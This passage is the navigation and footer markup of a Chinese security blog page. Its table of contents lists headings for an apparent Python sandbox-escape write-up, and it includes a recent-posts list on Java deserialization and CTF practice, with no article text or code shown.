href="#%E6%A0%88%E5%B8%A7-%E7%B2%97%E7%95%A5%E7%89%88"><span class="toc-number">2.3.6.</span> <span class="toc-text">栈帧(粗略版)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D"><span class="toc-number">2.4.</span> <span class="toc-text">字符串匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E5%8F%98%E5%BD%A2"><span class="toc-number">2.4.1.</span> <span class="toc-text">base64变形</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%BA%8F"><span class="toc-number">2.4.2.</span> <span class="toc-text">逆序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#list-dict"><span class="toc-number">2.4.3.</span> <span class="toc-text">list+dict</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode"><span class="toc-number">2.4.4.</span> <span class="toc-text">unicode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%B1%9E%E6%80%A7%E5%90%8D"><span class="toc-number">2.4.5.</span> <span class="toc-text">过滤属性名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals-1"><span class="toc-number">2.4.6.</span> <span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%B1%BB"><span class="toc-number">2.4.7.</span> <span class="toc-text">基类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import"><span class="toc-number">2.4.8.</span> <span class="toc-text">import</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.9.</span> <span class="toc-text">[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%98%E2%80%99"><span class="toc-number">2.4.10.</span> <span class="toc-text">‘’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">2.4.11.</span> <span class="toc-text">+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">2.4.12.</span> <span class="toc-text">数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.4.13.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.4.14.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">2.4.15.</span> <span class="toc-text">()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.16.</span> <span class="toc-text">过滤括号调用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#f%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.4.17.</span> <span class="toc-text">f字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.18.</span> <span class="toc-text">builtins函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E5%92%8C%E9%80%97%E5%8F%B7"><span class="toc-number">2.4.19.</span> <span class="toc-text">点号和逗号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="toc-number">2.5.</span> <span class="toc-text">命名空间限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%83%A8%E5%88%86%E6%A8%A1%E5%9D%97"><span class="toc-number">2.5.1.</span> <span class="toc-text">限制部分模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E7%A9%BAbuiltins"><span class="toc-number">2.5.2.</span> <span class="toc-text">清空builtins</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">2.6.</span> <span class="toc-text">长度限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8F"><span class="toc-number">2.6.1.</span> <span class="toc-text">交互式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.6.2.</span> <span class="toc-text">Web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="toc-number">2.7.</span> <span class="toc-text">多行限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">2.7.1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compile"><span class="toc-number">2.7.2.</span> <span class="toc-text">compile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.7.3.</span> <span class="toc-text">海象表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">2.8.</span> <span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gc"><span class="toc-number">2.8.1.</span> <span class="toc-text">gc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#traceback"><span class="toc-number">2.8.2.</span> <span class="toc-text">traceback</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#audit-hook"><span class="toc-number">2.9.</span> <span class="toc-text">audit hook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#loader"><span class="toc-number">2.9.1.</span> <span class="toc-text">__loader__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#posixsubprocess"><span class="toc-number">2.9.2.</span> <span class="toc-text">_posixsubprocess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.3.</span> <span class="toc-text">篡改内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AF%BC%E5%85%A5%E8%80%8C%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="toc-number">2.9.4.</span> <span class="toc-text">不导入而获取模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Opcode"><span class="toc-number">2.10.</span> <span class="toc-text">Opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9co-code"><span class="toc-number">2.10.1.</span> <span class="toc-text">修改co_code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6"><span class="toc-number">2.11.</span> <span class="toc-text">输出限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">2.11.1.</span> <span class="toc-text">异常处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AST%E6%B2%99%E7%AE%B1"><span class="toc-number">2.12.</span> <span class="toc-text">AST沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-Call"><span class="toc-number">2.12.1.</span> <span class="toc-text">ast.Call</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-Attribute"><span class="toc-number">2.12.2.</span> <span class="toc-text">ast.Attribute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-Assign"><span class="toc-number">2.12.3.</span> <span class="toc-text">ast.Assign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-Constant"><span class="toc-number">2.12.4.</span> <span class="toc-text">ast.Constant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-Subscript"><span class="toc-number">2.12.5.</span> <span class="toc-text">ast.Subscript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ast-For"><span class="toc-number">2.12.6.</span> <span class="toc-text">ast.For</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="Java反射与URLDNS链分析">Java反射与URLDNS链分析</a><time datetime="2025-07-14T08:02:16.000Z" title="发表于 2025-07-14 16:02:16">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/" title="Java反序列化概念与利用">Java反序列化概念与利用</a><time datetime="2025-07-13T16:44:50.000Z" title="发表于 2025-07-14 00:44:50">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/13/20250713%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250713随缘刷题">20250713随缘刷题</a><time datetime="2025-07-13T13:35:32.000Z" title="发表于 2025-07-13 21:35:32">2025-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250711随缘刷题">20250711随缘刷题</a><time datetime="2025-07-10T16:22:11.000Z" title="发表于 2025-07-11 00:22:11">2025-07-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Java基础知识">Java基础知识</a><time datetime="2025-07-10T13:46:08.000Z" title="发表于 2025-07-10 21:46:08">2025-07-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>